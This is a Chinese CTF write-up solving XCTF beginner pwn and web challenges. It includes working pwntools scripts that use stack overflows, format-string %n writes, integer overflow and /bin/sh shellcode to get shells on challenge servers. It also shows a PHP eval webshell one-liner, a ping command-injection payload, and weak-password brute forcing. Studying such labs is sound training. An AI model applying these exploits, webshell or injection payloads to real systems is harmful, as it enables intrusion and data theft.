  puts("~~ welcome to ctf ~~     ");
  puts("lets get helloworld for bof");
  read(0, &unk_601068, 0x10uLL);
  if ( dword_60106C == 1853186401 )
    sub_400686();
  return 0LL;
}
```

当**dword_60106C**的值为**1853186401**时，程序会进入一个函数中，而这个函数的作用就是显示flag，接下来就是去改变这个变量的值。

```shell
.bss:0000000000601068 unk_601068      db    ? ;               ; DATA XREF: main+3B↑o
.bss:0000000000601069                 db    ? ;
.bss:000000000060106A                 db    ? ;
.bss:000000000060106B                 db    ? ;
.bss:000000000060106C dword_60106C    dd ?                    ; DATA XREF: main+4A↑r
```

双击查看**unk_601068**和**dword_60106C**的位置，可以知道这两个变量都在.bss段，并且**dword_60106C**就在离**unk_601068**四个位置的地方，而且**unk_601068**是由我们输入的，而且给了10个长度，可以借此覆盖掉**dword_60106C**，去掉中文使用exp：

```python
from pwn import *
r=remote('220.249.52.134',40334)#远程连接
payload='A'*4+p64(1853186401)#4个字符覆盖68
r.recvuntil("d for bof\n")#接收到字符后
r.sendline(payload)#发送payload
print(r.recv())
```

cyberpeace{a8c51e75d4edd892c05980ec5e30363b}

#### 6-Pwn-cgpwn2

**题目来源**

CGCTF

**题目描述**

菜鸡认为自己需要一个字符串

**题目场景**  

220.249.52.134:49499

**题目附件**  

[53c24fc5522e4a8ea2d9ad0577196b2f](https://adworld.xctf.org.cn/media/task/attachments/53c24fc5522e4a8ea2d9ad0577196b2f)

**题目思路：**

题目给了pwn的函数是利用系统调用打印"hehehe"，存在一个call system在0x0804855A，由于hello函数中的gets函数获取的字符串s没有输入字符数量的限制，直接栈溢出，将返回地址覆盖为call system，由于name在bss段中，地址固定不变，程序中调用了_system函数，但是没有/bin/sh，把name赋值为/bin/sh并且将其作为参数传给_system函数

**解题过程：**

拿到程序后，我们首先`checksec`一下，发现是32位小端序，保护开启了RELRO和NX，没有Stack和PIE，载入IDA，F5反编译得到伪C代码，进入hello函数：

```c
char *hello(){
  char *v0; // eax
  signed int v1; // ebx
  unsigned int v2; // ecx
  char *v3; // eax
  char s; // [esp+12h] [ebp-26h]
  int v6; // [esp+14h] [ebp-24h]
......
  puts("please tell me your name");
  fgets(name, 0x32, stdin);
  puts("hello,you can leave some message here:");
  return gets(&s);
}
```

首先要求我们通过fgets函数输入一个名字，从键盘读取最多0x32个字符到name区域，然后提示我们通过gets函数输入一些信息，没有输入字符数量的限制

```shell
.bss:0804A080 name            db 34h dup(?)           ; DATA XREF: hello+77↑o
```

name是bss段的一个大小为34的区域，s区域的起始位置是距离栈底0x26个字节的地方，大小不限

```shell
-00000038 ;
......
-00000026 s               db ?
......
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008
+00000008 ; end of stack variables
```

在左边的函数列表中，有一个叫做pwn的函数，在实际运行过程中并不会被调用，这个函数利用系统调用打印"hehehe"，按下tab后按下空格可以看到在0804855A 有一个call _system

```c++
.text:0804854D pwn             proc near
.text:0804854D ; __unwind {
.text:0804854D                 push    ebp
.text:0804854E                 mov     ebp, esp
.text:08048550                 sub     esp, 18h        ; Integer Subtraction
.text:08048553                 mov     dword ptr [esp], offset command ; "echo hehehe"
.text:0804855A                 call    _system         ; Call Procedure
.text:0804855F                 nop                     ; No Operation
.text:08048560                 leave                   ; High Level Procedure Exit
.text:08048561                 retn                    ; Return Near from Procedure
.text:08048561 ; } // starts at 804854D
.text:08048561 pwn             endp
```

在hello函数中有一个部分用gets函数向栈的s区域读取了字符串，gets函数不限制字符数量程序并且没有开启stack保护，输入字符串覆盖栈上hello函数的返回地址，程序执行完hello函数之后返回到call _system这里，然后把name赋值为/bin/sh，最后把name也就是/bin/sh当参数传入system。

脚本：

```python
from pwn import *
p = remote('220.249.52.134', 49499)
name=0x0804A080
callsystem=0x0804855A
parameter="/bin/sh"#参数
payload="A"*0x26+"a"*4+p32(callsystem)+p32(name)#26+4到达返回地址后依次传入call_system和name的地址
p.recvuntil("name")
p.sendline(parameter)
p.recvuntil("here:")
p.sendline(payload)
p.interactive()
```

cyberpeace{3e0e437f3c60f9d6ea2390df1e800233}

#### 7-Pwn-CGfsb

**题目来源：**

CGCTF

**题目描述：**

菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用

**题目场景：**  

111.200.241.244:40185

**题目附件：**

[e41a0f684d0e497f87bb309f91737e4d](https://adworld.xctf.org.cn/media/task/attachments/e41a0f684d0e497f87bb309f91737e4d)

**题目思路：**

[格式化字符串漏洞视频讲解](https://www.bilibili.com/video/BV19A411t7XF)，[printf格式化字符串漏洞原理与利用](https://bbs.pediy.com/thread-250858.htm)

构造payload，在格式化字符串中包含想要写入的地址，此时该地址会随格式化字符串放在栈上，然后用格式化字符串的`%K$n`来实现改写功能。

**解题过程：**

拿到程序后，我们首先`checksec`一下，发现是32位，保护开启了CANNARY和NX，载入IDA，找到main函数，F5反编译得到伪C代码：

```c#
int __cdecl main(int argc, const char **argv, const char **envp){
  int buf; // [esp+1Eh] [ebp-7Eh]
  int v5; // [esp+22h] [ebp-7Ah]
  __int16 v6; // [esp+26h] [ebp-76h]
  char s; // [esp+28h] [ebp-74h]
  unsigned int v8; // [esp+8Ch] [ebp-10h]
  v8 = __readgsdword(0x14u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  buf = 0;
  v5 = 0;
  v6 = 0;
  memset(&s, 0, 0x64u);
  puts("please tell me your name:");
  read(0, &buf, 0xAu);
  puts("leave your message please:");
  fgets(&s, 100, stdin);
  printf("hello %s", &buf);
  puts("your message is:");
  printf(&s);
  if ( pwnme == 8 ){
    puts("you pwned me, here is your flag:\n");
    system("cat flag");
  }
  else{
    puts("Thank you!");
  }
  return 0;
}
```

当pwnme=8的时候执行system函数，显示出flag。一般printf的参数是：格式化字符串 + 参数1 + 参数2 ...。如果后面的参数数量对应不上格式化字符串中需要的参数，会自动从栈顶获取对应的参数。这样我们就可以根据输入的字符离栈顶的偏移再次找到它，最后利用%k$n将其解析为地址，然后改变地址上存储的数据，达到内存覆盖。

![img](https://img-blog.csdnimg.cn/20201003204424560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTI4OTAwOTU=,size_16,color_FFFFFF,t_70)

输入“AAAAAAA%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x”  之后，因为后面没有对应%x的参数，所以直接从栈顶开始获取参数，到第10个%x获取到41414141，查询ASCII表发现是输入的信息的开头的AAAA

或者通过gdb调试，利用printf的漏洞，来确定输入的内容是格式化字符串第几个参数

![在这里插入图片描述](https://img-blog.csdnimg.cn/2019092509365644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1MDY2MjU3,size_16,color_FFFFFF,t_70)

找到pwnme的位置，经过32位编码转换，是4位

```shell
.bss:0804A068 pwnme           dd ?                    ; DATA XREF: main+105↑r
```

接下来利用%k$n写入，在格式化字符串中，"%s"、"%d" 等类型的符号叫符号说明，这里有几个冷门的符号说明：

![img](https://bbs.pediy.com/upload/attach/201904/823237_AJWMDN56MCB9PE3.jpg)

解释一下%10$n，找到格式化字符串后的第10个参数，将参数解析为地址，将已经输出的字节长度写入此地址，脚本：

```python
from pwn import *
#io = process("./CGfsb")
io = remote('111.200.241.244',40185)
pwnme_addr = 0x804A068
payload = p32(pwnme_addr) + 'A' * 4 + '%10$n';#4位地址+4位字符输出组成8位，利用%k$n赋到pwnme地址上，使pwnme=8
io.sendlineafter("please tell me your name:\n","aaaa")
io.sendlineafter("leave your message please:\n",payload)
io.interactive()
```

cyberpeace{3f49e5587bdf9b3537041be32468aa17}

#### 8-Pwn-int_overflow

**题目描述：**

菜鸡感觉这题似乎没有办法溢出，真的么?

**题目场景**  

111.200.241.244:44057

**题目附件：**

[51ed19eacdea43e3bd67217d08eb8a0e](https://adworld.xctf.org.cn/media/task/attachments/51ed19eacdea43e3bd67217d08eb8a0e)

**题目思路：**

整数分为有符号和无符号两种类型，有符号数以最高位作为其符号位，即正整数最高位为1，负数为0，无符号数取值范围为非负数。unsigned short  int类型占用2字节，取值范围0~65535。

**解题过程：**

对于一个2字节的Unsigned short int型变量，它的有效数据长度为两个字节，当它的数据长度超过两个字节时，使用的数据仅为最后2个字节，溢出的部分则直接忽略。

| dec  | 1    | 65537                       |
| ---- | ---- | --------------------------- |
| bin  | `1`  | `1` `0000 0000` `0000 0001` |
|      | 1位  | 1位+1字节+8位               |

对于unsigned short  int类型的两个变量var1、var2，假定取值var1  =  1，var2  = 65537，因此会出现var1=var2的情况。

```c++
#include <stdio.h>
int main(){ 
    unsigned short int var1 = 1, var2 = 65537;
    if (var1 == var2){ 
        printf("溢出");
    } 
    return 0;
} 
//结果：溢出
```

回到题目，我们首先`checksec`一下，发现是32位小端序，保护开启了NX，没有Stack和PIE

载入IDA，F5反编译得到伪C代码，在main函数中，没有任何可疑的，进入login函数：

```c++
int login(){
  char buf; // [esp+0h] [ebp-228h]
  char s; // [esp+200h] [ebp-28h]
  memset(&s, 0, 0x20u);
  memset(&buf, 0, 0x200u);
  puts("Please input your username:");
  read(0, &s, 0x19u);
  printf("Hello %s\n", &s);
  puts("Please input your passwd:");
  read(0, &buf, 0x199u);
  return check_passwd(&buf);
}
```

接受了一个最大长度为0x199(409)的buf，进入check_passwd函数：

```c++
char *__cdecl check_passwd(char *passwds){
  char *result; // eax
  char dest; // [esp+4h] [ebp-14h]
  unsigned __int8 v3; // [esp+Fh] [ebp-9h]
  v3 = strlen(passwds);
  if ( v3 <= 3u || v3 > 8u ){
    puts("Invalid Password");
    result = (char *)fflush(stdout);
  }
  else{
    puts("Success");
    fflush(stdout);
    result = strcpy(&dest, passwds);
  }
  return result;
}
```

用一个一字节8位的变量v3存储passwds(buf)的长度，最后存在一个字符串拷贝，拷贝目的地在栈中，长度为0x14(20)。

```shell
-00000018 ; D/A/*   : change type (data/ascii/array)
-00000018 ; N       : rename
-00000018 ; U       : undefine
-00000018 ; Use data definition commands to create local variables and function arguments.
-00000018 ; Two special fields " r" and " s" represent return address and saved registers.
-00000018 ; Frame size: 18; Saved regs: 4; Purge: 0
-00000018 ;
......
-00000014 dest            db ?
......
-00000009 var_9           db ?
......
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008 passwds         dd ?                    ; offset
+0000000C
+0000000C ; end of stack variables
```

在字符串拷贝过程中，输入0x14(20)个字符之后，就可以覆盖函数返回地址了，但是限制输入长度在3~8之间，但是由于是unsigned类型，只保留最后2字节，而且由于buf<0x199(409)，所以也只能是`0x14覆盖到完栈+4覆盖s+4位返回地址+一个随机数`在259~264之间。

| dec  | 3      | 8      | 259               | 264               | 771>409            |
| ---- | ------ | ------ | ----------------- | ----------------- | ------------------ |
| bin  | `0011` | `1000` | `1` `0000` `0011` | `1` `0000` `1000` | `11` `0000` `0011` |

shift+f12查看字符串，发现cat flag字符串，双击进去x键跟踪一下，tab+空格切换视图，查看调用得到what_is_this地址0x0804868B。

```sh
.text:0804868B                 public what_is_this
.text:0804868B what_is_this    proc near
.text:0804868B ; __unwind {
.text:0804868B                 push    ebp
.text:0804868C                 mov     ebp, esp
.text:0804868E                 sub     esp, 8
.text:08048691                 sub     esp, 0Ch
.text:08048694                 push    offset command  ; "cat flag"
.text:08048699                 call    _system
.text:0804869E                 add     esp, 10h
.text:080486A1                 nop
.text:080486A2                 leave
.text:080486A3                 retn
.text:080486A3 ; } // starts at 804868B
.text:080486A3 what_is_this    endp
```

脚本，其中payload中每部分位置是根据栈结构而来，最后一部分若删除，则不通过3<v3<8：

```python
from pwn import *
import random
io = remote("111.200.241.244",44057)
cat_flag_addr = 0x0804868B
io.sendlineafter("Your choice:", "1")
io.sendlineafter("your username:", "Scorpio_m7")
io.recvuntil("your passwd:")
payload = "a" * 0x14 + "a"*4 + p32(cat_flag_addr)+"a"*random.randint(231,235)#0x14(20)+4*a+r(4)+(231~235)*a=259~264
io.sendline(payload)
io.recv()
io.interactive()
```

cyberpeace{fbac44e615408e63bd35f714a21ce50c}

#### 9-Pwn-get_shell

**题目描述：**

运行就能拿到shell呢，真的

**题目场景：**  

111.200.241.244:32037

**题目附件：**

[fb99f86956bd401da271f57d22010481](https://adworld.xctf.org.cn/media/task/attachments/fb99f86956bd401da271f57d22010481)

**题目思路：**

打开Ubuntu直接nc -nv ip地址 端口

**解题过程：**
```bash
giantbranch@ubuntu:~/Desktop/pwn$ nc -nv 111.200.241.244 32037
Connection to 111.200.241.244 32037 port [tcp/*] succeeded!
cat flag
cyberpeace{008c6ace779d59a63427487c49b775cf}
```
cyberpeace{008c6ace779d59a63427487c49b775cf}

#### 10-Pwn-string

**题目来源：**

NUAACTF

**题目描述：**

菜鸡遇到了Dragon，有一位巫师可以帮助他逃离危险，但似乎需要一些要求

**题目场景：**  

111.200.241.244:57862

**题目附件：**

[1d3c852354df4609bf8e56fe8e9df316](https://adworld.xctf.org.cn/media/task/attachments/1d3c852354df4609bf8e56fe8e9df316)

**题目思路：**

POP攻击链：通过格式化字符串漏洞修改v4[0]的值，使之与v4[1]相等。然后读入shellcode并运行。

**解题过程：**

拿到程序后，我们首先`checksec`一下，发现是64位，保护开启了CANNARY和NX，未开启 PIE，载入IDA64，找到main函数，F5反编译得到伪C代码。主函数，第一层。动态分配内存(malloc)，地址赋给v3。然后v3赋给v4，相当于v3和v4都指向同一地址。然后输出v4指向的地址和下一个第一个地址。

```c#
__int64 __fastcall main(__int64 a1, char **a2, char **a3){
  _DWORD *v3; // rax
  __int64 v4; // ST18_8
  setbuf(stdout, 0LL);
  alarm(0x3Cu);
  sub_400996(60LL, 0LL);
  v3 = malloc(8uLL);
  v4 = (__int64)v3;
  *v3 = 68;
  v3[1] = 85;
  puts("we are wizard, we will give you hand, you can not defeat dragon by yourself ...");
  puts("we will tell you two secret ...");
  printf("secret[0] is %x\n", v4, a2);
  printf("secret[1] is %x\n", v4 + 4);
  puts("do not tell anyone ");
  sub_400D72(v4);
  puts("The End.....Really?");
  return 0LL;
}
```

进入sub_400D72(v4);函数，第二层，输入name，没有漏洞。

```c#
unsigned __int64 __fastcall sub_400D72(__int64 a1){
  char s; // [rsp+10h] [rbp-20h]
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]
  v3 = __readfsqword(0x28u);
  puts("What should your character's name be:");
  _isoc99_scanf("%s", &s);
  if ( strlen(&s) <= 0xC ){
    puts("Creating a new player.");
    sub_400A7D();
    sub_400BB9();
    sub_400CA6((_DWORD *)a1);
  }
  else{
    puts("Hei! What's up!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

进入sub_400A7D();函数，第三层，选择east或up。但是选up会被dragon干掉，所以必须选east

```c#
unsigned __int64 sub_400A7D(){
  char s1; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
  v2 = __readfsqword(0x28u);
  puts(" This is a famous but quite unusual inn. The air is fresh and the");
  puts("marble-tiled ground is clean. Few rowdy guests can be seen, and the");
  puts("furniture looks undamaged by brawls, which are very common in other pubs");
  puts("all around the world. The decoration looks extremely valuable and would fit");
  puts("into a palace, but in this city it's quite ordinary. In the middle of the");
  puts("room are velvet covered chairs and benches, which surround large oaken");
  puts("tables. A large sign is fixed to the northern wall behind a wooden bar. In");
  puts("one corner you notice a fireplace.");
  puts("There are two obvious exits: east, up.");
  puts("But strange thing is ,no one there.");
  puts("So, where you will go?east or up?:");
  while ( 1 ){
    _isoc99_scanf("%s", &s1);
    if ( !strcmp(&s1, "east") || !strcmp(&s1, "east") )
      break;
    puts("hei! I'm secious!");
    puts("So, where you will go?:");
  }
  if ( strcmp(&s1, "east") ){
    if ( !strcmp(&s1, "up") )
      sub_4009DD(&s1, "up");
    puts("YOU KNOW WHAT YOU DO?");
    exit(0);
  }
  return __readfsqword(0x28u) ^ v2;
}
```

返回上一层，进入sub_400BB9();函数，printf(&format, &format); 存在格式化字符串任意写的漏洞。

```c#
unsigned __int64 sub_400BB9(){
  int v1; // [rsp+4h] [rbp-7Ch]
  __int64 v2; // [rsp+8h] [rbp-78h]
  char format; // [rsp+10h] [rbp-70h]
  unsigned __int64 v4; // [rsp+78h] [rbp-8h]
  v4 = __readfsqword(0x28u);
  v2 = 0LL;
  puts("You travel a short distance east.That's odd, anyone disappear suddenly");
  puts(", what happend?! You just travel , and find another hole");
  puts("You recall, a big black hole will suckk you into it! Know what should you do?");
  puts("go into there(1), or leave(0)?:");
  _isoc99_scanf("%d", &v1);
  if ( v1 == 1 ){
    puts("A voice heard in your mind");
    puts("'Give me an address'");
    _isoc99_scanf("%ld", &v2);
    puts("And, you wish is:");
    _isoc99_scanf("%s", &format);
    puts("Your wish is");
    printf(&format, &format);
    puts("I hear it, I hear it....");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

返回上一层，进入sub_400CA6((_DWORD *)a1);函数，倒数第四行是v1转化为可执行函数，而v1是我们可以控制输入的。本题没有出现system函数，所以要在此处执行特定的代码，而这些代码也就是俗称的shellcode。

```c#
unsigned __int64 __fastcall sub_400CA6(_DWORD *a1){
  void *v1; // rsi
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
  v3 = __readfsqword(0x28u);
  puts("Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!");
  puts("Dragon say: HaHa! you were supposed to have a normal");
  puts("RPG game, but I have changed it! you have no weapon and ");
  puts("skill! you could not defeat me !");
  puts("That's sound terrible! you meet final boss!but you level is ONE!");
  if ( *a1 == a1[1] ){
    puts("Wizard: I will help you! USE YOU SPELL");
    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
    read(0, v1, 0x100uLL);
    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);
  }
  return __readfsqword(0x28u) ^ v3;
}
```

但是，要运行至此处，要先满足 if ( *a1 == a1[1] )，a1是第一层的v4传入函数的形参，就是打印出来的地址。 a[0]=v4[0]=v3[0]=68 , a[1]=v4[1]=v3[1]=85 。要将a[0]和a[1]修改为相同的值。可以通过sub_400BB9();函数中printf(&format, &format); 格式化字符串任意写的漏洞来修改。函数sub_400BB9()内的v2是我们输入的v4的地址，我们需要知道v2在栈内的位置，这样才能通过 %?$n 向v2指向的地址处写入字符串长度。

```python
#查看sub_400BB9()栈内情况 
from pwn import * 
p = remote("111.200.241.244",57862) 
context(arch='amd64', os='linux', log_level='debug')
p.recvuntil('secret[0] is ') 
v4_addr = int(p.recvuntil('\n')[:-1], 16)  #获取v4地址,注意把末尾的 \n 剔除
p.sendlineafter("What should your character's name be:", 'cxk') 
p.sendlineafter("So, where you will go?east or up?:", 'east') 
p.sendlineafter("go into there(1), or leave(0)?:", '1') 
p.sendlineafter("'Give me an address'", str(int(v4_addr))) 
p.sendlineafter("And, you wish is:",'AAAAAAAA'+'-%p'*10) #找到v2在栈中的位置
p.recvuntil('I hear it')
''''Your wish is\n'
    'AAAAAAAA-0x7fe7485bb6a3-0x7fe7485bc780-0x7fe7482ed2c0-0x7fe7487e3700-0x7fe7487e3700-0x100000022-0x1013010-0x4141414141414141-0x252d70252d70252d-0x2d70252d70252d70I hear it, I hear it....\n'
    'Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!\n'
'''
```

0x1013010是v2的内容，因为v2在format的前面一位，而通过0x4141414141414141可以找到format的起始位置。v2是栈内第7个参数。通过格式化字符串漏洞绕过判断后，执行shellcode，拿到主机权限。

```python
from pwn import * 
p = remote("111.200.241.244","57862") 
context(arch='amd64', os='linux', log_level='debug') 
p.recvuntil('secret[0] is ') 
v4_addr = int(p.recvuntil('\n')[:-1], 16) #获取v4地址,注意把末尾的 \n 剔除
p.sendlineafter("What should your character's name be:", 'cxk')
p.sendlineafter("So, where you will go?east or up?:", 'east') 
p.sendlineafter("go into there(1), or leave(0)?:", '1') 
p.sendlineafter("'Give me an address'", str(int(v4_addr))) 
p.sendlineafter("And, you wish is:", 'A' * 85 +'%7$n') #将85写入栈内第7个参数所指向的地址。
shellcode = asm(shellcraft.sh()) #获得执行system(“/bin/sh”)汇编代码
p.sendlineafter("USE YOU SPELL", shellcode) 
p.interactive()
```

cyberpeace{7ddc52779438fbe1a0db0b9fa506d3d0}

### WEB

#### 1-Web-view_source

**题目来源：**

Cyberpeace-n3k0

**题目描述：**

X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。

**题目场景：**

111.198.29.45：36480

**题目思路：**

禁用了右键点击，F12或者ctrl+u查看源码

**解题过程：**

![1](https://img-blog.csdnimg.cn/2019052320242036.JPG)

F12或者ctrl+u查看源码

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Where is the FLAG</title>
</head>
<body>
<script>
document.oncontextmenu=new Function("return false")
document.onselectstart=new Function("return false")
</script>
<h1>FLAG is not here</h1>
<!-- cyberpeace{2de302da29d64f714ce76482e326c734} -->
</body>
</html>
```

cyberpeace{2de302da29d64f714ce76482e326c734}

#### 2-Web-robots

**题目来源：**

Cyberpeace-n3k0

**题目描述：**

X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。

**题目场景：**

111.198.29.45：44490

**题目思路：**

robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。

**解题过程：**

考robots协议的理解，这里查看robots.txt发现可疑目录，访问ip+端口+/f1ag_1s_h3re.php拿到flag

![3](https://img-blog.csdnimg.cn/2019052320262332.JPG)

cyberpeace{54fa572dcdf3ccff700a252a5275f366}

#### 3-Web-backup

**题目来源：**

Cyberpeace-n3k0

**题目描述：**

X老师忘记删除备份文件，他派小宁同学去把备份文件找出来，一起来帮小宁同学吧！

**题目场景:**  

111.198.29.45:44491

**题目思路：**

考查一个备份文件，正常的备份一般是加.bak

**解题过程：**

访问ip/index.php/.bak就可以下载到备份文件，查看文件拿到flag

![4](https://img-blog.csdnimg.cn/20190523202644639.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI2NDA2NDQ3,size_16,color_FFFFFF,t_70)

cyberpeace{855A1C4B3401294CB6604CCC98BDE334}

#### 4-Web-cookie

**题目来源：**

Cyberpeace-n3k0

**题目描述：**

X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’

**题目场景:**  

111.198.29.45:41261

**题目思路：**

Cookie是当主机访问Web服务器时，由 Web 服务器创建的，将信息存储在用户计算机上的文件。一般网络用户习惯用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 Session 跟踪而存储在用户本地终端上的数据，而这些数据通常会经过加密处理。

**解题过程：**

访问网页检查元素查看网络-cookie，看到cookie.php，然后直接访问111.198.29.45:41261/cookie.php，看到提示说查看response，响应消息头就藏着flag

![5](https://img-blog.csdnimg.cn/20190523202554703.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI2NDA2NDQ3,size_16,color_FFFFFF,t_70)

cyberpeace{a819f68b2700f12b33e88902e4c1666b}

**题目来源：**

Cyberpeace-n3k0

**题目描述：**

X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？

**题目场景:**  

111.198.29.45:41471

**题目思路：**

js前端知识

**解题过程：**

浏览器访问题目有个按钮，查看源码可以发现是个input输入框，那直接post发送auth=flag数据就得到flag了或者在查看器中直接删掉disabled，这个按钮就可以按了，然后得到flag

![6](https://img-blog.csdnimg.cn/20190523202700806.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI2NDA2NDQ3,size_16,color_FFFFFF,t_70)

cyberpeace{155c587a04f74c8f6529ada24226602c}

#### 6-Web-weak_auth

**题目来源：**

Cyberpeace-n3k0

**题目描述：**

小宁写了一个登陆验证页面，随手就设了一个密码。

**题目场景:**  

111.200.241.244:60861

**题目思路：**

这道题是个弱密码题，随便尝试登录，会告诉你用admin来登录，可以使用burpsite暴力破解，弱密码是易于猜测的密码，爆破的意思是用可能的密码一次一次尝试，直到猜对密码为止。

**解题过程：**

打开链接，有一个登录页面当随便输入用户名user和密码password，弹出弹窗提示用admin账户登录，然后查看源码会提示你需要一个字典，这就很容易想到暴力破解了吧

这里用burp来尝试暴力破解，首先要安装好java，配置环境变量，然后下载burpsite的jar包，使用java命令打开后，抓取一个登录的包，ctrl+i设置好爆破位置和方法，设置好payload就开始攻击，可以从返回包的长度判断密码是否正确。

 ![9](https://img-blog.csdnimg.cn/20190523202804316.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI2NDA2NDQ3,size_16,color_FFFFFF,t_70)

 可以看到密码是123456的时候返回长度与别的都不一样，尝试用admin，123456来登录，登录成功获得flag

```
常见的密码
admin ——太容易猜出
123456 ——由于文化因素极其常用
BarackObama ——高知名度人物
monkey ——常见动物名且正好六位
password ——经常被使用，极易猜出
p@$$\/\/0rd ——简单的字母替换，易被黑客软件破译
nbusr123 ——常见人名
qwerty ——常用键盘的键排列
Taiwan ——地名
```
cyberpeace{158fb5f06d51a786219acd766c3b4003}

#### 7-Web-simple_php

**题目来源：**

Cyberpeace-n3k0

**题目描述：**

小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。

**题目场景:**  

111.200.241.244:59184

**题目思路：**

题目为simple_php，根据题目信息，判断是关于php代码审计的

**解题过程：**

打开题目，得到一串php代码

```php
<?php
show_source(__FILE__);
include("config.php");
$a=@$_GET['a'];
$b=@$_GET['b'];
if($a==0 and $a){//只要将a=0e1即可
    echo $flag1;
}
if(is_numeric($b)){//get的b不能是数字
    exit();
}
if($b>1234){//但又必须大于1234,这里可以用b=12345a绕过
    echo $flag2;
}
?>
```

代码就是以GET方式获得两个参数a和b，如果a和b满足一定条件，则打印flag1和flag2，将flag1和flag2拼接就能够得到完整flag，综合一下a和b,得到url为`?a=0e10&b=12345a`，最后访问http://ip:port/?a=0e10&b=12345a

Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}

#### 8-Web-get_post

**题目描述：**

X老师告诉小宁同学HTTP通常使用两种请求方法,你知道是哪两种吗？

**题目思路：**

按着提示来就能拿flag

get方式就在网址框输入?a=1

post方式就用hackbar的第二个

**解题过程：**

![2](https://img-blog.csdnimg.cn/20190523202436987.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI2NDA2NDQ3,size_16,color_FFFFFF,t_70)

cyberpeace{153e91524b81d5e276ccebf8640c1b45}

#### 9-Web-xff_referer

**题目描述：**

X老师告诉小宁其实xff和referer是可以伪造的。

**题目思路：**

本题是考察的HTTP头的伪装修改

**X-Forwarded-For (XFF)** 在客户端访问服务器的过程中如果需要经过HTTP代理或者负载均衡服务器,可以被用来获取最初发起请求的客户端的IP地址,这个消息首部成为事实上的标准。在消息流从客户端流向服务器的过程中被拦截的情况下,服务器端的访问日志只能记录代理服务器或者负载均衡服务器的IP地址。如果想要获得最初发起请求的客户端的IP地址的话,那么 X-Forwarded-For 就派上了用场。
这个消息首部会被用来进行调试和统计,以及生成基于位置的定制化内容,按照设计的目的,它会暴露一定的隐私和敏感信息,比如客户端的IP地址。所以在应用此消息首部的时候,需要将用户的隐私问题考虑在内。

**Referer**请求头包含了当前请求页面的来源页面的地址,即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 `Referer` 请求头识别访问来源,可能会以此进行统计分析、日志记录以及缓存优化等。

**解题过程：**

方法一：F12,网络,消息头,重新编辑报文,在最下面加入Referer:https://www.google.com,X-Forwarded-For:123.123.123.123,再发送。

从响应载荷下面一长串中可以找到flag。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191025100435583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoaWRvbmdoYW5n,size_16,color_FFFFFF,t_70)

方法二：

打开bp抓包,发送到Request,更改

Referer:https://www.google.com

X-Forwarded-For:123.123.123.123

然后发送

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191027232134353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI2MDEyODg5,size_16,color_FFFFFF,t_70)

cyberpeace{ee36528e83628466c63b97fbac0c64dd}

#### 10-Web-webshell

**题目描述：**

小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。

**题目思路：**

这道题考查菜刀的使用,用过的话就没什么难度

题目描述中提示了一句话木马是index.php,访问网页ip:端口/index.php,看到一句话是<?php @eval($_POST[‘shell’]);?>  ,得到’密码‘是shell,菜刀连接,文件管理就可以看到flag了
 ![10](https://img-blog.csdnimg.cn/20190523202821983.JPG)

cyberpeace{19646266ef681ffa45a0d5ff71c4db3c}

#### 11-Web-command_execution

**题目描述：**

 小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的,你知道为什么吗。 

**题目思路：**

这里先127.0.0.1 & find / -name "flag.*" 来查找flag文件的位置（找不到的话可以试下找flag文件）

